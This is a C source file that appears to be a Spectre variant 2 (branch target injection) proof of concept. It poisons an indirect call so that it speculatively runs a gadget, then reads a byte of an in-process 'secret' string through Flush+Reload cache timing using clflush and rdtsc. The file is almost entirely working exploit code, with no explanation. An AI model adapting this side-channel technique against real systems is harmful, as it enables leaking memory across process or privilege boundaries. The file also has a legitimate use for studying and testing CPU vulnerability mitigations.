#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

#ifdef _MSC_VER
#include <intrin.h>
#pragma optimize("gt", on)
#else
#include <x86intrin.h>
#endif


#define CACHE_HIT_THRESHOLD 100
#define GAP 1024

uint8_t channel[256 * GAP];
uint64_t *target;

char *secret = "This is a secret!";

int gadget(char *addr)
{
    return channel[*addr * GAP];
}

int safe_target()
{
    return 42;
}

int victim(char *addr, int input)
{
    int junk = 0;

    for (int i = 0; i <= 100; i++) 
    {
        input += i;
        junk += input & i;
    }

    int result;

    __asm volatile(
        "callq *%1\n"
        "mov %%eax, %0\n"
        : "=r" (result)
        : "r" (*target)
        : "rax", "rcx", "rdx", "rsi", "rdi",
          "r8", "r9", "r10", "r11"
    );

    return result & junk;
}


void readByte(char *addr_to_read, int all_hits[256])
{
    int hits[256];

    int tries, i, j;
    int junk = 0;

    uint64_t start, elapsed;

    uint8_t *addr;
    char dummyChar = '$';

    
    for (i = 0; i < 256; i++) 
    {
        hits[i] = 0;
        channel[i * GAP] = 1;
    }

    for (tries = 999; tries > 0; tries--) 
    {
        *target = (uint64_t)&gadget;
        _mm_mfence();

        for (j = 50; j > 0; j--) 
        {
            junk ^= victim(&dummyChar, 0);
        }

        _mm_mfence();

        for (i = 0; i < 256; i++)
            _mm_clflush(&channel[i * GAP]);

        _mm_mfence();

        *target = (uint64_t)&safe_target;
        _mm_mfence();

        _mm_clflush((void*)target);
        _mm_mfence();

        junk ^= victim(addr_to_read, 0);

        _mm_mfence();

        
        for (i = 0; i < 256; i++) 
        {

            int mix_i = ((i * 167) + 13) & 255;

            addr = &channel[mix_i * GAP];

            start = __rdtsc();

            junk ^= *addr;

            _mm_mfence();

            elapsed = __rdtsc() - start;

            if (elapsed <= CACHE_HIT_THRESHOLD)
                hits[mix_i]++;
        }
    }

    
    hits[0] ^= junk;

    for (i = 0; i < 256; i++)
        all_hits[i] = hits[i];
}

int main(int argc, char *argv[])
{
    target = (uint64_t*)malloc(sizeof(uint64_t));

    char *addr = secret;

    int all_hits[256];

    printf("Reading first byte at %p:\n\n", addr);

    readByte(addr, all_hits);

    printf("Hit counts:\n");

    for (int i = 0; i < 256; i++) 
    {

        if (all_hits[i] > 0) 
        {

            printf("%d", i);

            if (i >= 32 && i <= 126)
                printf(" ('%c')", i);
            else
                printf(" ('?')");

            printf(" : %d hits\n", all_hits[i]);
        }
    }

    printf("\n");

    free(target);

    return 0;
}